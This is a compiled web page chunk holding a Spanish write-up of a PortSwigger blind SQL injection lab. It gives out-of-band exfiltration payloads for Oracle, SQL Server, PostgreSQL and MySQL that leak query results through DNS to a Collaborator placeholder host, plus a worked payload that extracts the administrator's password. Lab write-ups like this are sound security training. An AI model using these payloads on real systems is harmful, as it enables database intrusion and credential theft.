import{_ as i,o as a,c as e,ai as s,at as o}from"./chunks/framework.DIUhWiTt.js";const k=JSON.parse('{"title":"Blind SQL injection with out-of-band data exfiltration - portswigger","description":"","frontmatter":{"title":"Blind SQL injection with out-of-band data exfiltration - portswigger","date":"2024-08-04T00:00:00.000Z","categories":["Write up","portswigger"],"tags":["sql injection"]},"headers":[],"relativePath":"notas/PortSwigger/1.SQL_Injection/15.Lab_Blind_SQL_injection_with_out-of-band_data_exfiltration/Blind_SQL_injection_with_out-of-band_data_exfiltration.md","filePath":"notas/PortSwigger/1.SQL_Injection/15.Lab_Blind_SQL_injection_with_out-of-band_data_exfiltration/Blind_SQL_injection_with_out-of-band_data_exfiltration.md"}'),n={name:"notas/PortSwigger/1.SQL_Injection/15.Lab_Blind_SQL_injection_with_out-of-band_data_exfiltration/Blind_SQL_injection_with_out-of-band_data_exfiltration.md"};function r(l,t,d,h,p,c){return a(),e("div",null,[...t[0]||(t[0]=[s('<h1 id="lab-blind-sql-injection-with-out-of-band-data-exfiltration" tabindex="-1">Lab: Blind SQL injection with out-of-band data exfiltration <a class="header-anchor" href="#lab-blind-sql-injection-with-out-of-band-data-exfiltration" aria-label="Permalink to “Lab: Blind SQL injection with out-of-band data exfiltration”">​</a></h1><p>Puede hacer que la base de datos realice una búsqueda de DNS en un dominio externo que contenga los resultados de una consulta inyectada. Para ello, deberá utilizar <a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator" target="_blank" rel="noreferrer">Burp Collaborator</a> para generar un subdominio exclusivo de Burp Collaborator que utilizará en su ataque y, luego, sondear el servidor de Collaborator para recuperar detalles de cualquier interacción de DNS, incluidos los datos exfiltrados.</p><table tabindex="0"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>Oracle</td><td><code>SELECT EXTRACTVALUE(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://&#39;|(SELECT YOUR-QUERY-HERE)|&#39;.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code></td></tr><tr><td>Microsoft</td><td><code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&#39;master..xp_dirtree &quot;//&#39;+@p+&#39;.BURP-COLLABORATOR-SUBDOMAIN/a&quot;&#39;)</code></td></tr><tr><td>PostgreSQL</td><td><code>create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into p (SELECT YOUR-QUERY-HERE); c := &#39;copy (SELECT &#39;&#39;&#39;&#39;) to program &#39;&#39;nslookup &#39;|p|&#39;.BURP-COLLABORATOR-SUBDOMAIN&#39;&#39;&#39;; execute c; END; $$ language plpgsql security definer; SELECT f();</code></td></tr><tr><td>MySQL</td><td><p>The following technique works on Windows only:<br><code>SELECT YOUR-QUERY-HERE INTO OUTFILE &#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&#39;</code></p></td></tr></tbody></table><p>En este ejercicio debemos de obtener las credenciales del usuario administrator, por lo que nos ayudaremos de <code>burp collaborator</code>, para ello usamos la siguiente <code>query</code>.</p><div class="language-c"><button title="Copy Code" class="copy"></button><span class="lang">c</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39; || (SELECT EXTRACTVALUE(xmltype(&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&lt;?</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">xml version</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;1.0&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> encoding</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;UTF-8&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">?&gt;&lt;!</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">DOCTYPE root [ </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&lt;!</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">ENTITY </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">%</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> remote SYSTEM </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;http://&#39;||(SELECT password from users where username=&#39;administrator&#39;)||&#39;.BURP-COLLABORATOR-SUBDOMAIN/&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> %</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">remote;]</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;),&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">l</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;) FROM dual)-- -</span></span></code></pre></div><p>La consulta debemos de ponerla dentro de : <code>&#39; || (&lt;query&gt;)</code>. Luego hacemos url encode y podemos enviarla para obtener las credenciales del usuario.</p><p><img src="'+o+'" alt="20240805125502.png"></p>',7)])])}const E=i(n,[["render",r]]);export{k as __pageData,E as default};
